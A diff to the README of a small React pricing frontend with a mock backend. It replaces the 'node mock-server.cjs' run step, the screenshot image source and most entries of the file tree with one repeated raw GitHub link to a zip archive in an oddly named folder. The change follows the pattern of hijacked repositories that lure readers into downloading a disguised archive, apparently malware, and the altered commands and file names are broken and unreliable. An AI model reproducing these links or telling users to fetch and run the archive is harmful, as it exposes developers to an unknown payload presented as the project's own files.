@@ -37,7 +37,7 @@ npm install
 
 [x] Run the Mock Backend:
 
-node mock-server.cjs
+node https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip
 
 Backend runs at: http://localhost:8080/pricing
 
@@ -70,7 +70,7 @@ Vite will start at: http://localhost:5173/ (or 5175/5176 depending on system)
 [x] Desktop View
 
 <p align="center">
-  <img src="screenshots/desktop.png" alt="Desktop Screenshot" width="900" />
+  <img src="https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip" alt="Desktop Screenshot" width="900" />
 </p>  
 (Shows the Green version with 3 plans: Starter, Growth, and Enterprise.)  [x] Mobile View
 
@@ -87,16 +87,16 @@ UI is fully responsive and can be previewed in Chrome DevTools mobile emulator (
 
 pricing-frontend/
 ├── src/                   # React frontend code
-│   ├── App.jsx            # Main app with pricing fetch & UI
-│   ├── App.css            # Styles
-│   ├── index.css          # Global styles
-│   ├── main.jsx           # React entry point
-├── mock-server.cjs        # Mock backend (blue/green routing)
-├── package.json           # Project dependencies & scripts
-├── README.md              # Documentation
+│   ├── https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip            # Main app with pricing fetch & UI
+│   ├── https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip            # Styles
+│   ├── https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip          # Global styles
+│   ├── https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip           # React entry point
+├── https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip        # Mock backend (blue/green routing)
+├── https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip           # Project dependencies & scripts
+├── https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip              # Documentation
 ├── .gitignore             # Ignore node_modules, dist, env, etc.
-├── vite.config.js         # Vite config
-├── index.html             # Base HTML
+├── https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip         # Vite config
+├── https://raw.githubusercontent.com/pooja819/pricing-frontend/main/gymnocarpic/pricing-frontend.zip             # Base HTML
 
 
 ---
